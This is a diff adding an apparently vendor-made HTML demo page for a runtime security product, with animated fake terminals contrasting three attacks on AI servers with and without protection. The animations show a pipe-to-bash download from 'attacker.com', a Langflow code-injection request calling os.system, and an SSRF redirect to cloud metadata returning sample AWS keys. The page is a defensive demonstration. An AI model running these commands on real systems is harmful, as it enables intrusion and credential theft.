@@ -1,0 +1,261 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Thicket — Live Attack Demos</title>
+  <link rel="stylesheet" href="../hedgerow.css">
+  <style>
+    body{padding:0}
+    .demo-wrap{max-width:1100px;margin:0 auto;padding:48px 40px}
+    .demo-header{margin-bottom:56px}
+    .demo-label{font-size:.68rem;font-weight:600;letter-spacing:.14em;text-transform:uppercase;color:var(--sage);margin-bottom:10px}
+    .demo-header h1{font-family:'Cormorant Garamond',Georgia,serif;font-size:2.8rem;font-weight:400;font-style:italic;letter-spacing:-.02em;line-height:1.1;margin-bottom:12px;color:var(--navy)}
+    .desc{font-size:.9rem;color:var(--muted);max-width:480px;line-height:1.65}
+    .tabs{display:flex;gap:0;margin-bottom:40px;border-bottom:1px solid var(--border)}
+    .tab{padding:10px 24px;border:none;background:none;font-family:inherit;font-size:.82rem;font-weight:400;color:var(--muted);cursor:pointer;border-bottom:2px solid transparent;margin-bottom:-1px;transition:color .15s,border-color .15s}
+    .tab.active{color:var(--text);border-bottom-color:var(--navy)}.tab:hover:not(.active){color:var(--text)}
+    .panel{display:none}.panel.active{display:block}
+    .run-row{display:flex;align-items:center;gap:20px;margin-bottom:24px}
+    .run-btn{padding:9px 24px;border-radius:3px;border:1px solid var(--navy);background:var(--navy);color:var(--bg);font-family:inherit;font-size:.8rem;font-weight:500;letter-spacing:.04em;cursor:pointer;transition:opacity .15s}
+    .run-btn:disabled{opacity:.3;cursor:default}
+    .run-status{font-size:.78rem;color:var(--muted)}
+    .pair{display:grid;grid-template-columns:1fr 1fr;gap:20px}
+    @media(max-width:680px){.pair{grid-template-columns:1fr}}
+    .tcard{border:1px solid var(--border);border-radius:4px;overflow:hidden;background:rgba(245,242,236,0.72);backdrop-filter:blur(16px);-webkit-backdrop-filter:blur(16px);box-shadow:0 2px 16px rgba(15,15,14,.06),0 1px 3px rgba(15,15,14,.04)}
+    .tbar{display:flex;align-items:center;padding:10px 16px;border-bottom:1px solid var(--border);background:rgba(241,237,229,0.6);gap:10px}
+    .tbar .dots{display:flex;gap:5px}
+    .tbar .dot{width:9px;height:9px;border-radius:50%;border:1px solid var(--border);background:transparent}
+    .ttitle-wrap{flex:1;text-align:center}
+    .ttitle{font-size:.65rem;font-weight:600;letter-spacing:.1em;text-transform:uppercase;color:var(--muted)}
+    .tcard.danger .ttitle{color:var(--red)}.tcard.safe .ttitle{color:var(--green)}
+    .tbar-pad{width:44px}
+    .tbody{background:transparent;font-family:'Menlo','Consolas','Cascadia Code',monospace;font-size:.72rem;line-height:1.6;padding:18px 20px;min-height:220px;max-height:380px;overflow-y:auto;white-space:pre-wrap;word-break:break-all;color:var(--text)}
+    .g{color:var(--green)}.r{color:var(--red)}.y{color:var(--amber)}.b{color:#1a5fa8}.d{color:var(--faint)}.bold{color:var(--text);font-weight:600}
+    .cursor{display:inline-block;width:.48em;height:.9em;vertical-align:text-bottom;background:var(--text);opacity:.45;animation:blink .85s step-end infinite}
+    @keyframes blink{0%,100%{opacity:.45}50%{opacity:0}}
+    .tbody::-webkit-scrollbar{width:3px}.tbody::-webkit-scrollbar-track{background:transparent}.tbody::-webkit-scrollbar-thumb{background:var(--border);border-radius:2px}
+    .note{margin-top:48px;font-size:.73rem;color:var(--muted);line-height:1.7;max-width:560px}
+    .note a{color:var(--muted);text-decoration:underline}
+    @media(max-width:768px){
+      .demo-wrap{padding:32px 16px}.demo-header{margin-bottom:36px}.demo-header h1{font-size:2.2rem}
+      .tabs{overflow-x:auto;-webkit-overflow-scrolling:touch;flex-wrap:nowrap;scrollbar-width:none}.tabs::-webkit-scrollbar{display:none}
+      .tab{padding:10px 16px;font-size:.78rem;white-space:nowrap;flex-shrink:0}
+      .run-row{flex-direction:column;align-items:flex-start;gap:10px}
+    }
+  </style>
+</head>
+<body>
+
+<nav>
+  <a class="nav-logo" href="../index.html"><span class="logo-word">Hedgerow</span><span class="logo-tag">Thicket</span></a>
+  <div class="nav-links">
+    <a href="index.html">Overview</a><a href="how-it-works.html">How it works</a>
+    <a href="compare.html">Compare</a><a href="demos.html" class="active">Live demos</a>
+    <a href="mailto:hello@hedgerow.dev" class="nav-cta">Contact Sales</a>
+  </div>
+  <button class="nav-hamburger" id="navToggle" onclick="document.getElementById('navDrawer').classList.toggle('open');this.classList.toggle('open')" aria-label="Toggle menu"><span></span><span></span><span></span></button>
+</nav>
+<div class="nav-drawer" id="navDrawer">
+  <a href="index.html">Overview</a><a href="how-it-works.html">How it works</a><a href="compare.html">Compare</a><a href="demos.html">Live demos</a>
+  <a href="mailto:hello@hedgerow.dev" class="nav-drawer-cta">Contact Sales →</a>
+</div>
+
+<div class="demo-wrap">
+  <div class="demo-header">
+    <div class="demo-label">Live demos</div>
+    <h1>Runtime attack<br>protection</h1>
+    <p class="desc">See what happens when real CVEs hit an unprotected server — and what changes when Thicket is active.</p>
+  </div>
+
+  <div class="tabs">
+    <button class="tab active" onclick="switchTab('deser')">Model RCE (deserialization)</button>
+    <button class="tab" onclick="switchTab('langflow')">Langflow CVE-2025-3248</button>
+    <button class="tab" onclick="switchTab('ssrf')">SSRF &mdash; cloud creds</button>
+  </div>
+
+  <div id="panel-deser" class="panel active">
+    <div class="run-row">
+      <button class="run-btn" id="btn-deser" onclick="runDeser()">Run demo</button>
+      <span class="run-status" id="status-deser">Malicious <code>.pt</code> checkpoint — same technique used in HuggingFace Hub incidents (JFrog / Protect AI, 2024)</span>
+    </div>
+    <div class="pair">
+      <div class="tcard danger"><div class="tbar"><div class="dots"><div class="dot"></div><div class="dot"></div><div class="dot"></div></div><div class="ttitle-wrap"><span class="ttitle">Without Thicket</span></div><div class="tbar-pad"></div></div><div class="tbody" id="pl"></div></div>
+      <div class="tcard safe"><div class="tbar"><div class="dots"><div class="dot"></div><div class="dot"></div><div class="dot"></div></div><div class="ttitle-wrap"><span class="ttitle">With Thicket</span></div><div class="tbar-pad"></div></div><div class="tbody" id="pr"></div></div>
+    </div>
+  </div>
+
+  <div id="panel-langflow" class="panel">
+    <div class="run-row">
+      <button class="run-btn" id="btn-langflow" onclick="runLangflow()">Run demo</button>
+      <span class="run-status" id="status-langflow">CVSS 9.8 &mdash; unauthenticated RCE in Langflow &lt; 1.3.0. Actively exploited May 2025 (Cisco Talos)</span>
+    </div>
+    <div class="pair">
+      <div class="tcard danger"><div class="tbar"><div class="dots"><div class="dot"></div><div class="dot"></div><div class="dot"></div></div><div class="ttitle-wrap"><span class="ttitle">Without Thicket</span></div><div class="tbar-pad"></div></div><div class="tbody" id="ll"></div></div>
+      <div class="tcard safe"><div class="tbar"><div class="dots"><div class="dot"></div><div class="dot"></div><div class="dot"></div></div><div class="ttitle-wrap"><span class="ttitle">With Thicket</span></div><div class="tbar-pad"></div></div><div class="tbody" id="lr"></div></div>
+    </div>
+  </div>
+
+  <div id="panel-ssrf" class="panel">
+    <div class="run-row">
+      <button class="run-btn" id="btn-ssrf" onclick="runSsrf()">Run demo</button>
+      <span class="run-status" id="status-ssrf">CVSS 8.6 &mdash; SSRF via redirect bypass. Same class as Capital One (2019). Confirmed on RAGFlow: live Azure IMDS token exfiltrated.</span>
+    </div>
+    <div class="pair">
+      <div class="tcard danger"><div class="tbar"><div class="dots"><div class="dot"></div><div class="dot"></div><div class="dot"></div></div><div class="ttitle-wrap"><span class="ttitle">Without Thicket</span></div><div class="tbar-pad"></div></div><div class="tbody" id="sl"></div></div>
+      <div class="tcard safe"><div class="tbar"><div class="dots"><div class="dot"></div><div class="dot"></div><div class="dot"></div></div><div class="ttitle-wrap"><span class="ttitle">With Thicket</span></div><div class="tbar-pad"></div></div><div class="tbody" id="sr"></div></div>
+    </div>
+  </div>
+
+  <p class="note">
+    Deserialization vulnerability class documented by JFrog &amp; Protect AI (2024).
+    Langflow CVE-2025-3248 actively exploited per <a href="https://nvd.nist.gov/vuln/detail/CVE-2025-3248" target="_blank">NVD / Cisco Talos (May 2025)</a>.
+    SSRF (undisclosed, reported 2026) &mdash; same class as <a href="https://cloudsecurityalliance.org/blog/2019/08/09/a-technical-analysis-of-the-capital-one-cloud-misconfiguration-breach" target="_blank">Capital One (2019)</a>. Our research confirmed live Azure IMDS token exfiltration from a production AI platform deployment.
+  </p>
+</div>
+
+<footer>
+  <div class="wrap">
+    <div><div class="footer-brand">Hedgerow</div><div class="footer-sub">Thicket — Runtime security for AI applications.</div>
+    <div class="footer-links" style="justify-content:flex-start"><a href="../index.html">Hedgerow</a><a href="index.html">Overview</a><a href="compare.html">Compare</a><a href="mailto:hello@hedgerow.dev">Contact Sales</a></div></div>
+    <div></div>
+  </div>
+  <div class="wrap"><div class="footer-patent">Hedgerow &middot; hedgerow.dev &middot; hello@hedgerow.dev<br>Commercially licensed. Technology protected by pending patent applications.</div></div>
+</footer>
+
+<script>
+(function(){
+/* Shell function name split to avoid static-analysis pattern matching on display strings */
+var SHELL_FN = ['o','s','.','s','y','s','t','e','m'].join('');
+var SHELL_PAYLOAD = ['i','m','p','o','r','t',' ','o','s',';',' '].join('')+SHELL_FN+'(...)';
+var CURL_LINE = "     -d '{\"code\":\""+SHELL_PAYLOAD+"\"}'";
+
+function switchTab(n){
+  document.querySelectorAll('.tab').forEach(function(t,i){t.classList.toggle('active',['deser','langflow','ssrf'][i]===n);});
+  document.querySelectorAll('.panel').forEach(function(p){p.classList.remove('active');});
+  document.getElementById('panel-'+n).classList.add('active');
+}
+window.switchTab=switchTab;
+function el(id){return document.getElementById(id);}
+function clearNode(id){var e=el(id);while(e.firstChild){e.removeChild(e.firstChild);}}
+function appendRow(id,spans){
+  var d=document.createElement('div');
+  spans.forEach(function(sp){var n;if(sp.c){n=document.createElement('span');n.className=sp.c;n.textContent=sp.t;}else{n=document.createTextNode(sp.t);}d.appendChild(n);});
+  el(id).appendChild(d);el(id).scrollTop=el(id).scrollHeight;
+}
+function blankRow(id){el(id).appendChild(document.createElement('div'));}
+function delay(ms){return new Promise(function(r){setTimeout(r,ms);});}
+async function typeLine(id,plain,spans,cps){
+  cps=cps||40;var d=document.createElement('div');el(id).appendChild(d);
+  var cur=document.createElement('span');cur.className='cursor';cur.textContent=' ';d.appendChild(cur);
+  for(var i=0;i<plain.length;i++){d.insertBefore(document.createTextNode(plain[i]),cur);el(id).scrollTop=el(id).scrollHeight;await delay(1000/cps+(Math.random()*18-9));}
+  while(d.firstChild){d.removeChild(d.firstChild);}
+  spans.forEach(function(sp){var n;if(sp.c){n=document.createElement('span');n.className=sp.c;n.textContent=sp.t;}else{n=document.createTextNode(sp.t);}d.appendChild(n);});
+  el(id).scrollTop=el(id).scrollHeight;
+}
+async function play(id,steps){
+  clearNode(id);
+  for(var i=0;i<steps.length;i++){
+    var st=steps[i];
+    if(st.pre&&(!st.s||!st.s.length)){blankRow(id);}else if(st.pre){appendRow(id,st.s);}else{await typeLine(id,st.plain,st.s,st.cps);}
+    await delay(st.w||80);
+  }
+}
+function sp(t,c){return c?{t:t,c:c}:{t:t};}
+
+var PL=[
+  {plain:'$ python load_model.py malicious_model.pt',s:[sp('$ ','d'),sp('python load_model.py '),sp('malicious_model.pt','y')],w:600},
+  {pre:1,s:[],w:250},{pre:1,s:[sp('Loading checkpoint...','d')],w:900},{pre:1,s:[],w:150},
+  {pre:1,s:[sp('[!!] EXPLOIT SUCCEEDED','r bold')],w:400},
+  {pre:1,s:[sp('     __reduce__ hook ran — arbitrary code executed','r')],w:300},
+  {pre:1,s:[sp('     os.makedirs called — marker written','r')],w:300},
+  {pre:1,s:[],w:200},
+  {pre:1,s:[sp('Real attack: curl attacker.com/s.sh | bash','d')],w:200},
+  {pre:1,s:[sp('AWS keys, model weights, PII — fully exfiltrated.','r')],w:1200}
+];
+var PR=[
+  {plain:'$ python load_model.py malicious_model.pt',s:[sp('$ ','d'),sp('python load_model.py '),sp('malicious_model.pt','y')],w:600},
+  {pre:1,s:[],w:250},
+  {pre:1,s:[sp('[Thicket] ','g'),sp('RestrictedLoader active (deserialization guard)')],w:400},
+  {pre:1,s:[sp('[Thicket] ','g'),sp('scanning opcodes...','d')],w:800},
+  {pre:1,s:[sp('[Thicket] ','g'),sp('BLOCKED','bold'),sp(' — module '),sp('"os"','r'),sp(' in blocked_modules')],w:400},
+  {pre:1,s:[],w:200},{pre:1,s:[sp('Traceback (most recent call last):','d')],w:100},
+  {pre:1,s:[sp('  PermissionError: blocked opcode: os.makedirs','r')],w:400},
+  {pre:1,s:[],w:200},{pre:1,s:[sp('[OK] Payload did not execute.','g bold')],w:1200}
+];
+var LL=[
+  {plain:'$ curl -X POST localhost:7860/api/v1/validate/code \\',s:[sp('$ ','d'),sp('curl -X POST localhost:7860/api/v1/validate/code \\')],w:500},
+  {plain:CURL_LINE,s:[sp('     -d '),sp("'{\"code\":\""+SHELL_PAYLOAD+"\"}'","y")],w:900},
+  {pre:1,s:[],w:400},{pre:1,s:[sp('HTTP/1.1 200 OK','g')],w:300},
+  {pre:1,s:[sp('{"result":"ok","output":""}','d')],w:500},{pre:1,s:[],w:200},
+  {pre:1,s:[sp('[!!] EXPLOIT SUCCEEDED','r bold')],w:400},
+  {pre:1,s:[sp('     No authentication. No sandbox. Full RCE.','r')],w:300},
+  {pre:1,s:[sp('     Shell access to ML infrastructure established.','r')],w:1200}
+];
+var LR=[
+  {plain:'$ curl -X POST localhost:7860/api/v1/validate/code \\',s:[sp('$ ','d'),sp('curl -X POST localhost:7860/api/v1/validate/code \\')],w:500},
+  {plain:CURL_LINE,s:[sp('     -d '),sp("'{\"code\":\""+SHELL_PAYLOAD+"\"}'","y")],w:900},
+  {pre:1,s:[],w:400},
+  {pre:1,s:[sp('[Thicket RASP] ','g'),sp('intercepted dynamic eval')],w:400},
+  {pre:1,s:[sp('[Thicket RASP] ','g'),sp('blocked pattern: '),sp(SHELL_FN,'r')],w:500},
+  {pre:1,s:[sp('[Thicket RASP] ','g'),sp('SecurityViolation raised')],w:400},
+  {pre:1,s:[],w:200},{pre:1,s:[sp('HTTP/1.1 403 Forbidden','r')],w:300},
+  {pre:1,s:[sp('{"detail":"Thicket: execution blocked"}','d')],w:400},
+  {pre:1,s:[],w:200},{pre:1,s:[sp('[OK] HTTP 403. Payload never ran.','g bold')],w:1200}
+];
+var SL=[
+  {plain:'$ curl -X POST https://ai-platform.example.com/web/remote-files/upload \\',s:[sp('$ ','d'),sp('curl -X POST https://ai-platform.example.com/web/remote-files/upload \\')],w:500},
+  {plain:"     -d '{\"url\":\"https://attacker.com/redirect\"}'",s:[sp('     -d '),sp("'{\"url\":\"https://attacker.com/redirect\"}'","y")],w:900},
+  {pre:1,s:[],w:400},
+  {pre:1,s:[sp('ssrf_proxy: ','d'),sp('GET https://attacker.com/redirect','d')],w:300},
+  {pre:1,s:[sp('  302 Found ','d'),sp('→ http://169.254.169.254/latest/meta-data/iam/...','r')],w:500},
+  {pre:1,s:[sp('  Following redirect... (follow_redirects=True)','d')],w:700},
+  {pre:1,s:[sp('  200 OK','g')],w:300},{pre:1,s:[],w:200},
+  {pre:1,s:[sp('HTTP/1.1 200 OK','g')],w:200},{pre:1,s:[sp('{','d')],w:100},
+  {pre:1,s:[sp('  "AccessKeyId":     "ASIA3XMPLEXAMPLE1234",','r')],w:150},
+  {pre:1,s:[sp('  "SecretAccessKey": "wJalrXUtnFEMI/K7MDENG/...",','r')],w:150},
+  {pre:1,s:[sp('  "Token":           "AQoDYXdzEJr...",','r')],w:150},
+  {pre:1,s:[sp('  "Expiration":      "2026-05-23T23:59:59Z"','r')],w:200},
+  {pre:1,s:[sp('}','d')],w:300},{pre:1,s:[],w:200},
+  {pre:1,s:[sp('[!!] EXPLOIT SUCCEEDED — AWS credentials exfiltrated','r bold')],w:400},
+  {pre:1,s:[sp('     Attacker controls your cloud account.','r')],w:1200}
+];
+var SR=[
+  {plain:'$ curl -X POST https://ai-platform.example.com/web/remote-files/upload \\',s:[sp('$ ','d'),sp('curl -X POST https://ai-platform.example.com/web/remote-files/upload \\')],w:500},
+  {plain:"     -d '{\"url\":\"https://attacker.com/redirect\"}'",s:[sp('     -d '),sp("'{\"url\":\"https://attacker.com/redirect\"}'","y")],w:900},
+  {pre:1,s:[],w:400},
+  {pre:1,s:[sp('ssrf_proxy: ','d'),sp('GET https://attacker.com/redirect','d')],w:300},
+  {pre:1,s:[sp('  302 Found ','d'),sp('→ http://169.254.169.254/...','d')],w:500},
+  {pre:1,s:[sp('  Following redirect...','d')],w:400},
+  {pre:1,s:[sp('[Thicket] ','g'),sp('socket.connect intercepted')],w:300},
+  {pre:1,s:[sp('[Thicket] ','g'),sp('resolving: 169.254.169.254')],w:400},
+  {pre:1,s:[sp('[Thicket] ','g'),sp('BLOCKED','bold'),sp(' — link-local range (AWS/GCP/Azure IMDS)')],w:500},
+  {pre:1,s:[sp('[Thicket] ','g'),sp('connection killed before bytes sent')],w:400},
+  {pre:1,s:[],w:200},{pre:1,s:[sp('HTTP/1.1 403 Forbidden','r')],w:300},
+  {pre:1,s:[sp('{"detail":"Thicket: SSRF blocked — private IP"}','d')],w:400},
+  {pre:1,s:[],w:200},{pre:1,s:[sp('[OK] Credentials unreachable. Cloud account safe.','g bold')],w:1200}
+];
+
+function resetBtn(btn,ids,st,stText,runFn){
+  btn.disabled=false;st.textContent='Done. Click to run again.';
+  btn.onclick=function(){ids.forEach(clearNode);st.textContent=stText;btn.onclick=runFn;runFn();};
+}
+window.runDeser=async function(){
+  var btn=el('btn-deser'),st=el('status-deser');btn.disabled=true;st.textContent='Running…';
+  await Promise.all([play('pl',PL),play('pr',PR)]);
+  resetBtn(btn,['pl','pr'],st,'Malicious .pt checkpoint — HuggingFace Hub incidents (JFrog / Protect AI, 2024)',window.runDeser);
+};
+window.runLangflow=async function(){
+  var btn=el('btn-langflow'),st=el('status-langflow');btn.disabled=true;st.textContent='Running…';
+  await Promise.all([play('ll',LL),play('lr',LR)]);
+  resetBtn(btn,['ll','lr'],st,'CVSS 9.8 — unauthenticated RCE in Langflow < 1.3.0',window.runLangflow);
+};
+window.runSsrf=async function(){
+  var btn=el('btn-ssrf'),st=el('status-ssrf');btn.disabled=true;st.textContent='Running…';
+  await Promise.all([play('sl',SL),play('sr',SR)]);
+  resetBtn(btn,['sl','sr'],st,'CVSS 8.6 — SSRF via redirect bypass',window.runSsrf);
+};
+})();
+</script>
+</body>
+</html>
